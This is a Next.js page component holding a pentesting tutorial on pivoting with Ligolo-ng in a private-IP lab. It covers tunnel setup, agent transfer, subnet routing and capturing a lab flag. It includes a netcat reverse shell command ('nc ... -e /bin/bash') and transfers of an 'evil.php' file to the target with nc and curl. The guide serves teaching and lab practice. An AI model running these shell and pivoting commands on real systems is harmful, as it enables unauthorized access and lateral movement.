import React from 'react';
import Link from 'next/link';
import Head from 'next/head';
import { useRouter } from 'next/router';

export default function Ligolo() {
  const router = useRouter();

  const handleBack = () => {
    router.back();
  };

  return (
    <>
      <Head>
        <title>Ligolo Documentation</title>
        <link
          href="https://fonts.googleapis.com/css2?family=Lexie+Readable:wght@400&display=swap"
          rel="stylesheet"
        />
      </Head>
      <div className="content-wrapper">
        <div className="documentation">
          <div className="category-info" id="statci-steps">
            <h3 className="category-title">Tunnel Like a Pro: Secure, Simple, and Efficient!</h3>
            <h4 className="category-description">
              Ligolo-ng is a cutting-edge tool designed for penetration testers, enabling the creation
              of secure tunnels using TUN interfaces. It offers a lightweight, fast, and efficient
              alternative to traditional methods like SOCKS proxies. With features such as easy setup,
              automatic certificate configuration, and support for multiple platforms, Ligolo-ng
              simplifies complex tunneling tasks, making it a preferred choice for professionals
              seeking reliable and secure network tunneling solutions.
            </h4>
          </div>
          <ul className="steps">
            <li className="step">
              <span className="step-number">1</span>
              <h4 className="step-title">Download the files or use my scripts.</h4>
              <div className="step-content">
                <a
                  href="https://github.com/Nicocha30/ligolo-ng"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  https://github.com/Nicocha30/ligolo-ng
                </a>
              </div>
            </li>
            <li className="step">
              <span className="step-number">2</span>
              <h4 className="step-title">Let's start the server</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    {`# Start the server
proxyloco

_________________________________________________________

AMD64
Ligolo-ng Proxy 0.5.1 Linux

¿Deseas descargar el proxy? [s/N] s

_________________________________________________________

¿Quieres iniciar la interfaz? [s/N] s
[sudo] password for User:
3: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500`}
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">3</span>
              <h4 className="step-title">Download the agent</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">proxylocomenu</span>
                    <br />
                    <span className="comment">
                      _________________________________________________________
                      <br />
                      AMD64
                      <br />
                      1 ligolo-ng Agent 0.5.1 linux
                      <br />
                      2 ligolo-ng Proxy 0.5.1 linux
                      <br />
                      <br />
                      ARM64
                      <br />
                      3 ligolo-ng Agent 0.5.1 linux
                      <br />
                      4 ligolo-ng Proxy 0.5.1 linux
                      <br />
                      <br />
                      _________________________________________________________
                      <br />
                      Choose the number of the download you want: 1
                      <br />
                      <br />
                      _________________________________________________________
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">4</span>
              <h4 className="step-title">Transfer the agent to the machine</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.88.159 - - [12/Jul/2024 21:25:44] "GET /agent HTTP/1.1" 200 -
</span>
                    <br />
                    <span className="comment">
                      #From the other machine        
                      <br />
                      wget http://192.168.88.13:8000/agent
                      <br />
                      --2024-07-12 21:25:44--  http://192.168.88.13:8000/agent
                      <br />
                      Connecting to 192.168.88.13:8000... connected.
                      <br />
                      HTTP request sent, awaiting response... 200 OK
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">5</span>
              <h4 className="step-title">Start the agent</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">
                      ./agent -connect 192.168.88.13:11601 -ignore-cert
                    </span>
                    <br />
                    <br />
                    <span className="comment">
                      WARN[0000] warning, certificate validation disabled
                      <br />
                      INFO[0000] Connection established addr="192.168.88.13:11601"
                    </span>
                    <br />
                    <br />
                    <span>
                      #on the server:
                      <br />
                      ligolo-ng » INFO[0229] Agent joined. name=user@domain
                      remote="192.168.88.159:40576"
                      <br />
                      ligolo-ng » ^C
                      <br />
                      input Ctrl-c once more to exit
                      <br />
                      ligolo-ng »
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">6</span>
              <h4 className="step-title">Server</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">ligolo-ng » session
[Agent : user@domain] » ifconfig
</span>
                    <br />
                    <span>
                      ┌────────────────────────────────────┐
                      <br />
                      │ Interface 0                        │
                      <br />
                      ├──────────────┬─────────────────────┤
                      <br />
                      │ Name         │ lo                  │
                      <br />
                      │ Hardware MAC │                     │
                      <br />
                      │ MTU          │ 65536               │
                      <br />
                      │ Flags        │ up|loopback|running │
                      <br />
                      │ IPv4 Address │ 127.0.0.1/8         │
                      <br />
                      │ IPv6 Address │ ::1/128             │
                      <br />
                      └──────────────┴─────────────────────┘
                      <br />
                      ┌───────────────────────────────────────────────┐
                      <br />
                      │ Interface 1                                   │
                      <br />
                      ├──────────────┬────────────────────────────────┤
                      <br />
                      │ Name         │ eth0                           │
                      <br />
                      │ Hardware MAC │ bc:24:11:2e:2a:6c              │
                      <br />
                      │ MTU          │ 1500                           │
                      <br />
                      │ Flags        │ up|broadcast|multicast|running │
                      <br />
                      │ IPv4 Address │ 192.168.88.159/24              │
                      <br />
                      │ IPv6 Address │ fe80::be24:11ff:fe2e:2a6c/64   │
                      <br />
                      └──────────────┴────────────────────────────────┘
                    </span>
                  </pre>
                </div>
              </div>
              <ul>
                <li className="step">
                  <span className="step-number">6.1</span>
                  <h4 className="step-title">Server terminal - no ligolo</h4>
                  <div className="step-content">
                    <div className="terminal">
                      <pre>
                        <span className="command">❯ ip a</span>
                        <br />
                        <br />
                        <span className="comment">
                          1: lo: {'<LOOPBACK,UP,LOWER_UP>'} mtu 65536 qdisc noqueue state UNKNOWN
                          group default qlen 1000
                          <br />
                          link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
                          <br />
                          inet 127.0.0.1/8 scope host lo
                          <br />
                          valid_lft forever preferred_lft forever
                          <br />
                          inet6 ::1/128 scope host noprefixroute
                          <br />
                          valid_lft forever preferred_lft forever
                          <br />
                          2: wlan0: {'<BROADCAST,MULTICAST,UP,LOWER_UP>'} mtu 1500 qdisc noqueue
                          state UP group default qlen 1000
                          <br />
                          link/ether a0:59:50:eb:23:64 brd ff:ff:ff:ff:ff:ff
                          <br />
                          inet 192.168.88.13/24 brd 192.168.88.255 scope global dynamic
                          noprefixroute wlan0
                          <br />
                          valid_lft 86288sec preferred_lft 86288sec
                          <br />
                          inet6 fe80::a259:50ff:feeb:2364/64 scope link noprefixroute
                          <br />
                          valid_lft forever preferred_lft forever
                          <br />
                          3: ligolo: {'<NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP>'} mtu 1500 qdisc
                          fq_codel state DOWN group default qlen 500
                          <br />
                          link/none
                        </span>
                        <br />
                        <br />
                        <span>#make sure ligolo is there.</span>
                      </pre>
                    </div>
                  </div>
                </li>
                <li className="step">
                  <span className="step-number">6.2</span>
                  <h4 className="step-title">Connect the subnet</h4>
                  <div className="step-content">
                    <div className="terminal">
                      <pre>
                        <span className="command">
                          sudo ip route add 192.168.122.0/24 dev ligolo
                          <br />
                          [sudo] password for
                        </span>
                        <br />
                        <br />
                        <span className="comment">#START the session back in ligolo terminal</span>
                        <br />
                        <br />
                        <span>
                          [Agent : user@domain] » start
                          <br />
                          [Agent : user@domain] » INFO[1104] Starting tunnel to User@domain
                        </span>
                      </pre>
                    </div>
                  </div>
                </li>
              </ul>
              <hr className="step-divider" />
            </li>
            <li className="step">
              <span className="step-number">7</span>
              <h4 className="step-title">Check the flag from the server terminal (no ligolo)</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">❯ curl 192.168.122.205</span>
                    <br />
                    <br />
                    <span className="comment">
                      ligolo-ng
                      <br />
                      flag:1219kj91
                      <br />
                      ❯ ping 192.168.122.205
                      <br />
                      PING 192.168.122.205 (192.168.122.205) 56(84) bytes of data.
                      <br />
                      64 bytes from 192.168.122.205: icmp_seq=1 ttl=64 time=8.50 ms
                      <br />
                      64 bytes from 192.168.122.205: icmp_seq=2 ttl=64 time=11.7 ms
                    </span>
                    <br />
                    <br />
                    <span>#apache server on the subnet 122</span>
                  </pre>
                </div>
              </div>
            </li>
            <div className="category-info" id="statci-steps">
              <h2 className="category-subtitle">Listener on the agent for reverse shell</h2>
              <h4 className="category-description">
                <div className="terminal">
                  <pre>
                    <span className="command">
                      [Agent : user@Domain] » listener_add --addr 192.168.220.1:1234 --to 127.0.0.1:1234
                      --tcp
                    </span>
                    <br />
                    <br />
                    <span className="comment">INFO[0418] Listener 0 created on remote agent!</span>
                  </pre>
                </div>
              </h4>
            </div>
            <li className="step">
              <span className="step-number">1</span>
              <h4 className="step-title">Start nc on the proxy server machine</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">
                      ncat -lvnp 1234 --keep-open
                      <br />
                      #also
                      <br />
                      nc -lvnp 1234
                    </span>
                    <br />
                    <br />
                    <span className="comment">
                      Ncat: Version 7.94SVN ( https://nmap.org/ncat )
                      <br />
                      Ncat: Listening on [::]:1234
                      <br />
                      Ncat: Listening on 0.0.0.0:1234
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">2</span>
              <h4 className="step-title">on the machine connect nc to the agent IP, no to the proxy server</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">nc 192.168.220.1 1234 -e /bin/bash</span>
                    <br />
                    <br />
                    <span className="comment">
                      ip r
                      <br />
                      192.168.220.0/24 dev enp1s0 proto kernel scope link src 192.168.220.234
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <div className="category-info" id="statci-steps">
              <h2 className="category-subtitle">Setting a server to transfer files</h2>
              <h4 className="category-description">Adding a listener</h4>
            </div>
            <li className="step">
              <span className="step-number">1</span>
              <h4 className="step-title">Add listener</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">
                      #[Agent : User@Domain] »
                      <br />
                      listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
                      <br />
                      listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
                    </span>
                    <br />
                    <br />
                    <span className="comment">
                      [Agent : User@Domain] » listener_list
                      <br />
                      │ Active listeners
                      <br />
                      │ # │ AGENT                              │ NETWORK │ AGENT LISTENER ADDRESS │
                      PROXY REDIRECT ADDRESS
                      <br />
                      │ 0 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 0.0.0.0:30000          │
                      127.0.0.1:10000
                      <br />
                      │ 1 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 192.168.220.1:30001    │
                      127.0.0.1:10001
                      <br />
                      │ 2 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 192.168.220.1:1234     │
                      127.0.0.1:1234
                      <br />
                      │ 3 │ #1 - User@Domain - 192.168.88.13:34288 │ tcp     │ 0.0.0.0:8080           │
                      127.0.0.1:80
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">2</span>
              <h4 className="step-title">On kali</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">python3 -m http.server 1234</span>
                    <br />
                    <br />
                    <span className="comment">
                      curl -O 192.168.220.1:1234/test
                      <br />
                      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                      <br />
                      Dload  Upload   Total   Spent    Left  Speed
                      <br />
                      100     6  100     6    0     0    742      0 --:--:-- --:--:-- --:--:--   750
                      <br />
                      ❯ ls
                      <br />
                      test
                    </span>
                    <br />
                    <br />
                    <span>
                      wget http://192.168.220.1:1234/test
                      <br />
                      --2024-07-12 23:28:39--  http://192.168.220.1:1234/test
                      <br />
                      Connecting to 192.168.220.1:1234... connected.
                      <br />
                      HTTP request sent, awaiting response... 200 OK
                      <br />
                      Length: 6 [application/octet-stream]
                      <br />
                      Saving to: 'test.1'
                      <br />
                      <br />
                      test.1                           100%[==================&gt;]       6
                      --.-KB/s    in 0s
                      <br />
                      2024-07-12 23:28:39 (573 KB/s) - 'test.1' saved [6/6]
                      <br />
                      ❯ ls
                      <br />
                      test   test.1
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">3</span>
              <h4 className="step-title">Using nc to send files</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">
                      #kali
                      <br />
                      nc -nlvp 1234 &lt; evil.php
                      <br />
                      Listening on 0.0.0.0 1234
                    </span>
                    <br />
                    <br />
                    <span className="comment">
                      #on the other machine
                      <br />
                      nc -nv 192.168.220.1 1234 &gt; evil.php
                      <br />
                      (UNKNOWN) [192.168.220.1] 1234 (?) open
                      <br />
                      ❯ ls
                      <br />
                      evil.php
                    </span>
                  </pre>
                </div>
              </div>
            </li>
            <li className="step">
              <span className="step-number">4</span>
              <h4 className="step-title">Using python script</h4>
              <div className="step-content">
                <div className="terminal">
                  <pre>
                    <span className="command">
                      #kali (I had to change the port in the script to 1234)
                      <br />
                      ❯ getpython
                      <br />
                      #to receive files with Python 2, from the other machine, do a curl like this:
                      #generic message
                      <br />
                      #curl -T file http://192.168.88.19:8000 #generic message
                    </span>
                    <br />
                    <br />
                    <span className="comment">
                      #on the other machine remember to use the IP from the client, no kali
                      <br />
                      curl -T evil.php 192.168.220.1:1234
                      <br />
                      curl: (52) Empty reply from server
                      <br />
                      <br />
                      #back kali
                      <br />
                      Host: 192.168.220.1:1234
                      <br />
                      User-Agent: curl/7.88.1
                      <br />
                      Accept: */*
                      <br />
                      Content-Length: 9
                      <br />
                      Expect: 100-continue
                      <br />
                      <br />
                      ❯ ls
                      <br />
                      evil.php
                    </span>
                  </pre>
                </div>
              </div>
            </li>
          </ul>
        </div>
        <button className="back-button" onClick={handleBack}>
          ← Back
        </button>
      </div>

      <style jsx>{`
        body {
          background-color: #0d1117;
          color: #33ff77;
          font-family: 'Lexie Readable', sans-serif;
          margin: 0;
          padding: 20px;
        }
        .content-wrapper {
          width: 80%;
          margin: 0 auto;
        }
        .documentation {
          border: 4px double #33ff77;
          padding: 30px;
          border-radius: 10px;
          background: #0d1117;
          text-align: left;
        }
        .category-info {
          margin-bottom: 30px;
        }
        .category-title {
          color: #33ff77;
          font-size: 1.8rem;
          margin-bottom: 15px;
          font-family: 'Courier New', monospace;
        }
        .category-description {
          color: #88cc88;
          font-size: 1.1rem;
          line-height: 1.6;
          font-family: 'Lexie Readable', sans-serif;
        }
        .steps {
          list-style: none;
          padding: 0;
        }
        .step {
          margin-bottom: 30px;
          position: relative;
        }
        .step-number {
          color: #33ff77;
          font-size: 1.2rem;
          font-weight: bold;
          margin-right: 10px;
          font-family: 'Courier New', monospace;
        }
        .step-title {
          color: #33ff77;
          font-size: 1.3rem;
          margin: 10px 0;
          font-family: 'Courier New', monospace;
        }
        .terminal {
          background-color: #000;
          color: #ffffff;
          font-family: 'Courier New', monospace;
          padding: 20px;
          margin: 20px 0;
          border-radius: 5px;
          border: 1px solid #33ff77;
        }
        .terminal pre {
          margin: 0;
          white-space: pre-wrap;
        }
        .command {
          color: #00ff00;
        }
        .comment {
          color: #ffff00;
        }
        .step-divider {
          border: 0;
          border-top: 1px solid #33ff77;
          margin: 30px 0;
        }
        a {
          color: #33ff77;
          text-decoration: none;
          font-family: 'Lexie Readable', sans-serif;
        }
        a:hover {
          text-decoration: underline;
        }
        .category-subtitle {
          color: #33ff77;
          font-family: 'Courier New', monospace;
        }
        .back-button {
          background: #33ff77;
          color: #0d1117;
          border: none;
          padding: 10px 20px;
          border-radius: 5px;
          cursor: pointer;
          margin-top: 20px;
          font-family: 'Courier New', monospace;
        }
        .back-button:hover {
          background: #2be066;
        }
      `}</style>
    </>
  );
}